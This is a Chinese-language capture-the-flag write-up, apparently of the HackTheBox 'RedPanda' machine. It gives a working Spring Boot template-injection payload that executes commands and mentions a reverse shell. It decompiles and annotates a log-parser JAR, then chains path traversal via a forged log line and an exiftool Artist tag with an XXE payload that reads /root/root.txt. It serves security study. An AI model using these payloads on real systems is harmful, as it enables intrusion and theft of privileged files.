nmap扫描结果

![](https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png)

---

![](https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png)

题目提示`injection`,推测为sql注入或者是模板注入

在测试时发现`%`被过滤,因此进行fuzz操作,发现`%_$~`被过滤

![](https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png)

同时发现请求`/favicon.ico`时返回`404`json且网页标题提示为`Spring Boot`,结合过滤的内容,推测为`Spring Boot`模板注入

![](https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png)

一顿操作后,得到模板注入为`*{{xxx}}`

![](https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png)

利用`name=*{{new+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("sleep+5").getInputStream()).next()}}`成功执行命令

![](https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png)

直接反弹好像会出问题,把反弹shell命令写成脚本传到服务器上再进行反弹

![](https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png)

---

![](https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png)

`find / -user root -perm -4000 -print 2>/dev/null`没发现可以利用的点

pspy监控如下

![](https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png)

`/opt/cleanup.sh`

```bash
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

`/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar`

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.logparser;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Scanner;
import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;

public class App {
    public App() {
    }

    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        return map;
    }

    public static boolean isImage(String filename) {
        return filename.contains(".jpg");
    }

    public static String getArtist(String uri) throws IOException, JpegProcessingException {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;//目录穿越,注意这里没有使用/进行闭合
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);//文件必须为jpg
        Iterator var4 = metadata.getDirectories().iterator();

        while(var4.hasNext()) {
            Directory dir = (Directory)var4.next();
            Iterator var6 = dir.getTags().iterator();

            while(var6.hasNext()) {
                Tag tag = (Tag)var6.next();
                if (tag.getTagName() == "Artist") {//利用exiftools构建图片,手动指定Artist的值
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }

    public static void addViewTo(String path, String uri) throws JDOMException, IOException {
        SAXBuilder saxBuilder = new SAXBuilder();//SAXBuilder如果使用默认配置就会触发XXE漏洞
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());
        File fd = new File(path);
        Document doc = saxBuilder.build(fd);
        Element rootElement = doc.getRootElement();
        Iterator var7 = rootElement.getChildren().iterator();

        while(var7.hasNext()) {
            Element el = (Element)var7.next();
            if (el.getName() == "image" && el.getChild("uri").getText().equals(uri)) {//存在image项且uri与传入的uri相同
                Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                System.out.println("Total views:" + Integer.toString(totalviews));
                rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                Integer views = Integer.parseInt(el.getChild("views").getText());
                el.getChild("views").setText(Integer.toString(views + 1));
            }
        }

        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }

    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);

        while(log_reader.hasNextLine()) {
            String line = log_reader.nextLine();
            if (isImage(line)) {//isImage(line) 这一行中包含 .jpg
                Map parsed_data = parseLog(line);
                System.out.println(parsed_data.get("uri"));
                String artist = getArtist(parsed_data.get("uri").toString());//artist可控
                System.out.println("Artist: " + artist);
                String xmlPath = "/credits/" + artist + "_creds.xml";
                addViewTo(xmlPath, parsed_data.get("uri").toString());//xmlPath->任意目录的xml文件
            }
        }

    }
}
```

1. /opt/panda_search/redpanda.log

```java
分割符号为||
public class test {
    public static void main(String[] args) {
        String a="asdlkfj||qwer";
        System.out.println(Arrays.toString(a.split("\\|\\|")));
    }
}

[asdlkfj, qwer]

map.put("status_code", Integer.parseInt(strings[0]));
map.put("ip", strings[1]);
map.put("user_agent", strings[2]);
map.put("uri", strings[3]);

log日志内容为

200||1.1.1.1||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36||/../../../../../../../../../../tmp/xxx.jpg
```

2. uri

```
/../../../../../../../../../../tmp/xxx.jpg

exiftool -Artist="../../../tmp/xxx" xxx.jpg

把xxx.jpg上传到服务器的/tmp目录
```

![](https://img.mi3aka.eu.org/2022/08/7b8be19e30b6aff68f71448e6b68fd82.png)

3. xmlPath

```
得到的artist为../../../tmp/xxx

生成的xmlPath为/credits/../../../tmp/xxx_creds.xml
```

4. xml内容

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY flag SYSTEM "file:///root/root.txt">
]>
<credits>
  <image>
    <uri>/../../../../../../../../../../tmp/xxx.jpg</uri>
    <views>1</views>
    <x>&flag;</x>
  </image>
  <totalviews>1</totalviews>
</credits>
```

在`java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar`完成后`/tmp/xxx_creds.xml`中的内容将被修改为`/root/root.txt`中的内容

![](https://img.mi3aka.eu.org/2022/08/94a6ee60ce0a576659daf235db011df7.png)